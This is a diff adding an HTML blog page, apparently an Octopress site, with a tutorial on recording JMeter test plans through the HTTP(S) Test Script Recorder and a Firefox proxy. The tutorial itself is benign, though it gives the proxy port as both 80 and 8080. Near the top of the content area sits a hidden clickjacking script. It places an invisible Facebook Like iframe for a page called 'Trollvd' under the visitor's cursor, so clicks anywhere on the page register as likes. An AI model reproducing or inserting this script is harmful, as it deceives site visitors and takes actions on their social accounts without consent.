@@ -1,0 +1,419 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Jmeter : How to use jmeter to record test scenarios - Selenium Tutorial</title>
+    <meta name="author" content="Ta Bao Lan">
+   	
+	<meta name="description" content="Jmeter : How to use record test scenarios" />
+	
+	<meta name="keywords" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link href="/atom.xml" rel="alternate" title="Selenium Tutorial" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Amethysta' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!--  <script src="/javascripts/ajaxify.js"></script> -->   
+
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    var pluginUrl =
+            '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+    _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+    _gaq.push(['_setAccount', 'UA-51278981-1']);
+    _gaq.push(['_trackPageview']);
+    function initGa() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    }
+    setTimeout(initGa, 50);
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+		Selenium Tutorial
+		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad-banner-responsive -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5798698216356388"
+     data-ad-slot="7145934352"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+</h1>
+<br>
+
+<ul id="social-links" style="text-align:center">
+  
+  
+  <!-- Google Plus -->
+  <li>
+  <a href="http://plus.google.com/lantabao?rel=author" class="google" title="Google+"></a>
+  </li>
+  
+  
+  <!-- Facebook -->
+  <li>
+  <a href="http://www.facebook.com/gaumun" class="facebook" title="Facebook"></a>
+  </li>
+  
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a href="http://www.linkedin.com/in/tabaolan" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  <!-- Skype -->
+  <li>
+  <a href="http://myskype.info/lantb1987" class="skype" title="Skype"></a>
+  </li>
+  
+  
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/categories/webdriver/">WebDriver</a></li>
+	<li id="ajax"><a href="/categories/newbie/">Selenium Beginner</a></li>
+	<li id="ajax"><a href="/categories/testng-framework/">TestNG Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-framework/">Automation Framework</a></li>
+	<li id="ajax"><a href="/categories/icecream-framework/">IceCream Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-mobile/">Selenium Mobile</a></li>
+    <li id="ajax"><a href="/categories/tricks/">Tips&Tricks</a></li>
+	<li id="ajax"><a href="/categories/jmeter/">JMETER</a></li>
+	<li id="ajax"><a href="/categories/mobiletest/">Mobile Testing</a></li>
+	
+    <li>
+    <div id="dark">
+        <form method="get" action="/search.html" id="search">
+            <input name="query" type="text" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+﻿
+</header>
+
+<div id="toload">
+<!-- begin toload -->
+<div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
+        <article class="post">
+
+	<h2 class="title">Jmeter : How to Use Jmeter to Record Test Scenarios</h2>
+	<div class="entry-content"><h2>How To Use JMeter To Record Test Scenarios</h2>
+
+<p>In this tutorial, I will teach you how to set up and use the Apache JMeter HTTP(S) Test Script Recorder to record HTTP requests. Recording HTTP requests is a great way to building test plans, and can be useful in creating tests that closely mimic a normal user&rsquo;s behaviour.</p>
+
+<h3>Start Building a Test Plan</h3>
+
+<p>First, start JMeter. Then let&rsquo;s start building a test plan. If you already have a test plan that you would like to start with, skip this section and move on to adding a Recording Controller to your Thread Group (the next section).</p>
+
+<p>Minimally, we will want to add a Thread Group and HTTP Request Defaults. Let&rsquo;s get start by adding a Thread Group.</p>
+
+<h4>Add a Thread Group</h4>
+
+<p>Add a Thread Group to Test Plan:</p>
+
+<p>1.Right-click on Test Plan</p>
+
+<p>2.Mouse over Add ></p>
+
+<p>3.Mouse over Threads (Users)</p>
+
+<p>4.Click on Thread Group</p>
+
+<p>Set the Thread Group properties with the following values:</p>
+
+<p><img src="/images/jmeter129.png"></p>
+
+<h4>Add an HTTP Request Defaults</h4>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="3378542759" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>Now let&rsquo;s add HTTP Request Defaults to Thread Group:</p>
+
+<p>1.Select Thread Group, then right-click it</p>
+
+<p>2.Mouse over Add</p>
+
+<p>3.Mouse over Config Element</p>
+
+<p>4.Click on HTTP Request Defaults</p>
+
+<p>In HTTP Request Defaults, under the Web Server section, fill in the Server Name or IP field with the name or IP address of the web server you want to test.</p>
+
+<p><img src="/images/jmeter130.png"></p>
+
+<h4>Add an HTTP Cookie Manager</h4>
+
+<p>If your web server uses cookies, you can add support for cookies by adding an HTTP Cookie Manager to the Thread Group:</p>
+
+<p>1.Select Thread Group, then right-click it</p>
+
+<p>2.Mouse over Add</p>
+
+<p>3.Mouse over Config Element</p>
+
+<p>4.Click on HTTP Cookie Manager</p>
+
+<h4>Add a Recording Controller</h4>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="9425076351" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>Now let&rsquo;s add a Recording Controller to Thread Group:</p>
+
+<p>1.Select Thread Group, then right-click it</p>
+
+<p>2.Mouse over Add</p>
+
+<p>3.Mouse over Logic Controller</p>
+
+<p>4.Click on Recording Controller</p>
+
+<p>The Recording Controller is where recorded HTTP Request samplers will be created. The next step is to set up an HTTP(S) Test Script Recorder.</p>
+
+<h4>Add HTTP(S) Test Script Recorder</h4>
+
+<p>Now let&rsquo;s add an HTTP(S) Test Script Recorder to the WorkBench:</p>
+
+<p>1.Select WorkBench, then right-click it</p>
+
+<p>2.Mouse over Add</p>
+
+<p>3.Mouse over Non-Test Elements</p>
+
+<p>4.Click on HTTP(S) Test Script Recorder</p>
+
+<p>Note: Items that are added to the WorkBench do not get saved with the rest of the test plan. If you want to save your WorkBench, right-click on WorkBench, then click Save Selection As&hellip;, and save it to your desired location. After it is saved, you may add it to any test plan that you have open by using the &ldquo;Merge&rdquo; menu item, and selecting your saved WorkBench.</p>
+
+<h4>Including or Excluding URL Patterns (Optional)</h4>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="7145934352" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>In the HTTP(S) Script Recorder, you may add URL Patterns, written as regular expressions, to include or exclude when you record. This can be useful to either include only the types of content you want to request (e.g. <em>.html, </em>.php, etc) or to exclude the types of content you do not want to request (e.g. <em>.jpg, </em>.png, *.js, etc).</p>
+
+<p>To add a URL Pattern, click the &ldquo;Add&rdquo; button under the URL Patterns to Include or URL Patterns to Exclude section, then click on the top of the white area in the section. You should now be able to type in a pattern. Repeat the process to add more patterns.</p>
+
+<p>Example: URL Patterns for webpages</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.*\.html
+</span><span class='line'>.*\.php
+</span><span class='line'>.*\.htm
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Adding Items to the Script Recorder (Optional)</h4>
+
+<p>Adding JMeter items to a the HTTP(S) Test Script Recorder will make recorded requests inherit the added item. For example, if we add a Timer item to the Script Recorder, the Timer will be added to each HTTP Request that is recorded. When the test is run, the timer will cause each test thread to wait before performing the HTTP Request.</p>
+
+<p>Let&rsquo;s add a Constant Timer to HTTP(S) Test Script Recorder, as an example:</p>
+
+<p>1.Select HTTP(S) Test Script Recorder, then Right-click it</p>
+
+<p>2.Mouse over Add</p>
+
+<p>3.Mouse over Timers</p>
+
+<p>4.Click on Constant Timers</p>
+
+<p>You may configure the thread delay to whatever you desire.</p>
+
+<p><img src="/images/jmeter131.png"></p>
+
+<p>Suppose that you want to simulate a user clicking on a different page every 2 seconds. Setting the thread delay to 2000 ms will accomplish this by adding a 2 second delay to each HTTP Request that is recorded.</p>
+
+<p>This is just one example of how you can add items to the Script Recorder to help create a test plan that performs the tests that you desire.</p>
+
+<h4>Start Recording</h4>
+
+<p>Clicking on the &ldquo;Start&rdquo; button, on the bottom of the Script Recorder window, will start the JMeter proxy server which will be used to intercept and record browser requests. Click on the Start button (of the recorder) now.</p>
+
+<p>The first time you attempt to run the recorder, it will display an error saying that it can&rsquo;t start because a certificate does not exist. Click OK, then click Start a second time. You should see a message that says that a temporary certificate named ApacheJMeterTemporaryRootCA.crt has been created in JMeter bin directory. Click OK and continue.</p>
+
+<p><img src="/images/jmeter132.png"></p>
+
+<p>Note: If you browser already uses a proxy, then you need to configure JMeter to use that proxy before starting JMeter, using the command-line options -H and -P.</p>
+
+<h4>Configure Firefox To Use JMeter Proxy</h4>
+
+<p>We will use Firefox as our browser when using the JMeter HTTP(S) Test Script Recorder because, unlike Chrome and some other browsers, it does allows you to override system-wide configuration for its proxy settings.</p>
+
+<p>Configure Firefox to use localhost (127.0.0.1) on port 80 as its proxy for all traffic by following these steps:</p>
+
+<p>1.Open Firefox</p>
+
+<p>2.Go to the Preferences menu</p>
+
+<p>3.Click on the Advanced tab</p>
+
+<p>4.Then Network tab</p>
+
+<p>5.In the &ldquo;Connection&rdquo; section, click on &ldquo;Settings&hellip;&rdquo;</p>
+
+<p>6.Select the &ldquo;Manual proxy configuration&rdquo; radio button</p>
+
+<p>7.Set HTTP Proxy to &ldquo;localhost&rdquo; and Port to &ldquo;8080&rdquo;</p>
+
+<p>8.Check &ldquo;Use this proxy server for all protocols&rdquo;</p>
+
+<p>9.Click OK and exit the Preferences menu.</p>
+
+<p>Note: When Firefox is configured to use JMeter&rsquo;s Script Recorder as a proxy, it will only work properly if the Script Recorder is running.</p>
+
+<h4>Recording HTTP Requests</h4>
+
+<p>Now that our test plan&rsquo;s HTTP(S) Test Script Recorder is running, and Firefox is configured to use it as a proxy, the HTTP requests that Firefox sends will be recorded. Let&rsquo;s test it out.</p>
+
+<p>In Firefox, go to your server&rsquo;s homepage (the same server that you configured in your JMeter HTTP Request Defaults):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://your_domain.com/
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now there should be a little triangle next to your Recording Controller. Click on it to expand and show the requests that it has recorded. You should see the HTTP requests that were recorded, depending on which URL Patterns you have included and excluded. Feel free to browse your site to record more requests.</p>
+
+<p>As you can see, a lot of requests were created. You may refine the list of HTTP requests by simply deleting unwanted entries here.</p>
+
+<p>If you do not see any entries under your Recording Controller, you will want to review your URL Patterns in the HTTP(S) Test Script Recorder (Hint: Remove all includes and excludes to record everything).</p>
+
+<p>Once you are done recording, click the &ldquo;Stop&rdquo; button at the bottom of the HTTP(S) Test Script Recorder window. Note that Firefox will no longer be able to reach any pages (because it is configured to use port 8080 as a proxy)&mdash;configure it to use &ldquo;No proxy&rdquo; if you want to function normally.</p>
+
+<h4>Run Your Test Plan</h4>
+
+<p>Once you are happy with the test plan you have recorded, save it, then run it. It will function exactly like a manually created test, so you can configure it, delete, and add items to make it match your desired test case more closely.</p>
+</div>
+
+<div class="meta">
+	
+		<span class="comments"><a href="/jmeter-how-to-use-jmeter-to-record-test-scenarios/#disqus_thread">Comments</a></span>
+	
+</div>
+
+<br>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+ </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2014
+
+    Ta Bao Lan
+. Powered by <a href="http://octopress.org">Octopress</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'tabaolan1987';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.tabaolan.com/jmeter-how-to-use-jmeter-to-record-test-scenarios/';
+        var disqus_url = 'http://www.tabaolan.com/jmeter-how-to-use-jmeter-to-record-test-scenarios/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+</body>
+</html>
